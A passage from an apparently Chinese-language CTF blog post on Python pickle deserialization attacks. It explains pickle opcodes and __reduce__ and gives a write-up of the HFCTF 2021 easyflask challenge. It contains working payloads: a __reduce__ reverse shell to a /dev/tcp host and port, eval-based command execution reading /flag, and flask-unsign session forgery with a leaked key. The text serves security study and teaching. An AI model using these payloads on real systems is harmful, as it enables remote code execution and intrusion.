class="number">0x160578603d0</span>&gt;]</span><br><span class="line"></span><br><span class="line">p <span class="number">5</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="built_in">object</span>, (<span class="literal">None</span>, __builtin__.<span class="built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="number">0x160578603d0</span>&gt;, &#123;&#125;]</span><br><span class="line"></span><br><span class="line">V a: stack[<span class="string">&quot;a&quot;</span>, &lt;__main__.Test at <span class="number">0x160578603d0</span>&gt;]</span><br><span class="line"></span><br><span class="line">p <span class="number">6</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="built_in">object</span>, (<span class="literal">None</span>, __builtin__.<span class="built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="number">0x160578603d0</span>&gt;, &#123;&#125;, <span class="string">&quot;a&quot;</span>]</span><br><span class="line"></span><br><span class="line">I <span class="number">1</span>: stack[<span class="number">1</span>, <span class="string">&quot;a&quot;</span>, &lt;__main__.Test at <span class="number">0x160578603d0</span>&gt;]</span><br><span class="line"></span><br><span class="line">s: stack[&#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;, &lt;__main__.Test at <span class="number">0x160578603d0</span>&gt;]</span><br><span class="line"></span><br><span class="line">b: stack[&lt;__main__.Test at <span class="number">0x160578603d0</span>&gt;]  <span class="comment"># set a = 1</span></span><br><span class="line"></span><br><span class="line">.: []  <span class="comment"># 返回 &lt;__main__.Test at 0x160578603d0&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>感觉还是很难理解</p>
+<p>所以 Python 官方提供了工具，叫 <code>pickletools</code>，它的作用主要是：</p>
+<ol>
+<li>可读性较强的方式展示一个序列化对象（<code>pickletools.dis</code>）</li>
+<li>对一个序列化结果进行优化（<code>pickletools.optimize</code>）</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickletools.dis(serialized))</span><br></pre></td></tr></table></figure>
+
+<p>结果如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    0: c    GLOBAL     &#x27;copy_reg _reconstructor&#x27;</span><br><span class="line">   25: p    PUT        0</span><br><span class="line">   28: (    MARK</span><br><span class="line">   29: c        GLOBAL     &#x27;__main__ Test&#x27;</span><br><span class="line">   44: p        PUT        1</span><br><span class="line">   47: c        GLOBAL     &#x27;__builtin__ object&#x27;</span><br><span class="line">   67: p        PUT        2</span><br><span class="line">   70: N        NONE</span><br><span class="line">   71: t        TUPLE      (MARK at 28)</span><br><span class="line">   72: p    PUT        3</span><br><span class="line">   75: R    REDUCE</span><br><span class="line">   76: p    PUT        4</span><br><span class="line">   79: (    MARK</span><br><span class="line">   80: d        DICT       (MARK at 79)</span><br><span class="line">   81: p    PUT        5</span><br><span class="line">   84: V    UNICODE    &#x27;a&#x27;</span><br><span class="line">   87: p    PUT        6</span><br><span class="line">   90: I    INT        1</span><br><span class="line">   93: s    SETITEM</span><br><span class="line">   94: b    BUILD</span><br><span class="line">   95: .    STOP</span><br><span class="line">highest protocol among opcodes = 0</span><br></pre></td></tr></table></figure>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>由于在反序列化的时候，这个对象要能在当前环境上下文中创建，所以在实际的利用过程中，那些默认加载的库、标准库（可被自动 import）就成了首选的类，比如 <code>os</code>，它有 <code>system</code> 方法。</p>
+<p>对于 Python 可以被 pickle&#x2F;unpickle 的对象以及其他一些注意事项,这里列出几点比较重要的:</p>
+<ol>
+<li><p>函数（内置函数或用户自定义函数）在被封存时，引用的是函数全名（这就是为什么 <code>lambda</code> 函数不可以被封存：所有的匿名函数都有同一个名字：<code>&lt;lambda&gt;</code>）。这意味着只有函数所在的模块名，与函数名会被封存，函数体及其属性不会被封存。因此，在解封的环境中，函数所属的模块必须是可以被导入的，而且模块必须包含这个函数被封存时的名称，否则会抛出异常</p>
+</li>
+<li><p>类也只封存名称，所以在解封环境中也有和函数相同的限制。注意，类体及其数据不会被封存，只有实例数据会被封存，所以在下面的例子中类属性 attr 不会存在于解封后的环境中：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">    attr = <span class="string">&#x27;A class attribute&#x27;</span></span><br><span class="line"></span><br><span class="line">picklestring = pickle.dumps(Foo)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>当实例解封时，它的 <code>__init__()</code> 方法通常不会被调用。其默认动作是：先创建一个未初始化的实例，然后还原其属性：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">save</span>(<span class="params">obj</span>):</span><br><span class="line">    <span class="keyword">return</span> (obj.__class__, obj.__dict__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">cls, attributes</span>):</span><br><span class="line">    obj = cls.__new__(cls)</span><br><span class="line">    obj.__dict__.update(attributes)</span><br><span class="line">    <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>payload 的构造分为用魔术方法自动构造和手动构造(手搓 opcode)</p>
+<h3 id="自动攻击"><a href="#自动攻击" class="headerlink" title="自动攻击"></a>自动攻击</h3><p>首先,这样序列化攻击是达不到攻击目的的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = os.system(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"></span><br><span class="line">test = Test()</span><br><span class="line"></span><br><span class="line">serialized = pickle.dumps(test,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(serialized)</span><br></pre></td></tr></table></figure>
+
+<p><code>os.system(&quot;whoami&quot;)</code> 在 <code>test = Test()</code> 就会被执行完毕，所以这个可以说是自己日自己了。</p>
+<h4 id="相关魔术方法"><a href="#相关魔术方法" class="headerlink" title="相关魔术方法"></a>相关魔术方法</h4><p>上面提到过，解封的时候是有一个默认的赋值过程，既然是默认行为，往往是有办法自定义的。Python 提供了很多魔术方法（比如比较常见的 <code>__reduce__</code>），来改变这一默认行为。下面一起来看下这些魔术方法都是怎么用的（下面几个方法的介绍，内容大部分都是摘录自官方文档）。</p>
+<h5 id="getnewargs-ex"><a href="#getnewargs-ex" class="headerlink" title="__getnewargs_ex__()"></a>__getnewargs_ex__()</h5><ol>
+<li><p>限制：</p>
+<ol>
+<li>对于使用 v2 版或更高版协议的 pickle 才能使用此方法</li>
+<li>必须返回一对 <code>(args, kwargs)</code> 用于构建对象，其中 <code>args</code> 是表示位置参数的 tuple，而 <code>kwargs</code> 是表示命名参数的 dict</li>
+</ol>
+<p><code>__getnewargs_ex__()</code> 方法 return 的值，会在解封时传给 <code>__new__()</code> 方法的作为它的参数</p>
+</li>
+</ol>
+<h5 id="getnewargs"><a href="#getnewargs" class="headerlink" title="__getnewargs__()"></a>__getnewargs__()</h5><p>限制：</p>
+<ol>
+<li>必须返回一个 tuple 类型的 <code>args</code></li>
+<li>如果定义了 <code>__getnewargs_ex__()</code>，那么 <code>__getnewargs__()</code> 就不会被调用</li>
+</ol>
+<p>这个方法与上一个 <code>__getnewargs_ex__()</code> 方法类似，但只支持位置参数</p>
+<p>注：在 Python 3.6 前，v2、v3 版协议会调用 <code>__getnewargs__()</code>，更高版本协议会调用 <code>__getnewargs_ex__()</code></p>
+<h5 id="setstate"><a href="#setstate" class="headerlink" title="__setstate__"></a>__setstate__</h5><p>在反序列化时自动执行。它可以在对象从其序列化状态恢复时，对对象进行自定义的状态还原。</p>
+<h5 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__"></a>__reduce__</h5><p>构造方法，在反序列化的时候自动执行，类似于php中的__wakeup</p>
+<h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><h4 id="没有os模块"><a href="#没有os模块" class="headerlink" title="没有os模块"></a>没有os模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read()&quot;</span>,))</span><br><span class="line">    </span><br><span class="line">a = A()</span><br><span class="line">a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br></pre></td></tr></table></figure>
+
+<h4 id="环境有os模块"><a href="#环境有os模块" class="headerlink" title="环境有os模块"></a>环境有os模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">aaa</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span>(os.system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a = aaa()</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(a)</span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#注意payloads生成的shell脚本需要在目标机器操作系统上执行，否则会报错</span></span><br></pre></td></tr></table></figure>
+
+<p>所以最好所有poc在linux上生成</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h3><p>上来提示&#x2F;file&#x3D;index.js</p>
+<p><img src="/images/image-20250910232610015.png" alt="image-20250910232610015"></p>
+<p>存在任意文件读取,先读个环境变量</p>
+<p><img src="/images/image-20250910231943930.png" alt="image-20250910231943930"></p>
+<p>这就有flag了?看来是非预期,注意到这里有个秘钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh</span><br></pre></td></tr></table></figure>
+
+<p>再看看app&#x2F;source</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_handler</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_handler</span>():</span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>抓包看看cookie</p>
+<p><img src="/images/image-20250910232259081.png" alt="image-20250910232259081"></p>
+<p>发现jwt,漏洞代码:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>伪造session实现 读取 u 中的 b值,对b中的值进行反序列化,可以直接触发RCE</p>
+<p>对cookie数据签名:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie <span class="string">&quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;payload&#x27;&#125;&#125;&quot;</span> --secret <span class="string">&quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>一会回来替换payload。</p>
+<p>在linux系统下运行以下代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system, (<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.122.131.175/2333 0&gt;&amp;1&quot;&#x27;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line">user=pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(user).decode())</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">gASVUQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDZiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzQ3LjEyMi4xMzEuMTc1LzIzMzMgMD4mMSKUhZRSlC4=</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成后替换payload,并伪造cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC90bXAvMScplIWUUpQu&#x27;&#125;&#125;&quot; --secret &quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20250911130450796.png" alt="image-20250911130450796"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.eyJ1Ijp7ImIiOiJnQVNWU1FBQUFBQUFBQUNNQ0dKMWFXeDBhVzV6bEl3RVpYWmhiSlNUbEl3dFgxOXBiWEJ2Y25SZlh5Z25iM01uS1M1emVYTjBaVzBvSjJOaGRDQXZabXhoWnlBK0lDOTBiWEF2TVNjcGxJV1VVcFF1In19.aMJmGQ.dppzM5WSDj4VyWzXfRsYX_7E6ng</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是很奇怪,怎么都弹不了shell,改一下命令直接把flag带出来好了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag &gt; /tmp/1&#x27;)&quot;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line">user=pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(user).decode())</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC90bXAvMScplIWUUpQu</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# flask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC90bXAvMScplIWUUpQu&#x27;&#125;&#125;&quot; --secret &quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到session</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eyJ1Ijp7ImIiOiJnQVNWU1FBQUFBQUFBQUNNQ0dKMWFXeDBhVzV6bEl3RVpYWmhiSlNUbEl3dFgxOXBiWEJ2Y25SZlh5Z25iM01uS1M1emVYTjBaVzBvSjJOaGRDQXZabXhoWnlBK0lDOTBiWEF2TVNjcGxJV1VVcFF1In19.aMJmsA.TG8jihGGbB1fpMg_7MiZOtcsJnI</span><br></pre></td></tr></table></figure>
+
+<p>然后去admin路由下改cookie</p>
+<p><img src="/images/image-20250911140736760.png" alt="image-20250911140736760"></p>
+<p>然后访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://85e89518-1277-4f43-b3b3-f147d35a58fe.node5.buuoj.cn:81/file?file=/tmp/1</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/images/image-20250911140814996.png" alt="image-20250911140814996"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;639e4746-17d1-49aa-9136-ad69a53d4faa&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0xgame-2023-Notebook"><a href="#0xgame-2023-Notebook" class="headerlink" title="[0xgame 2023 Notebook]"></a>[0xgame 2023 Notebook]</h3><p>环境找不到,不过从网上找到了源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 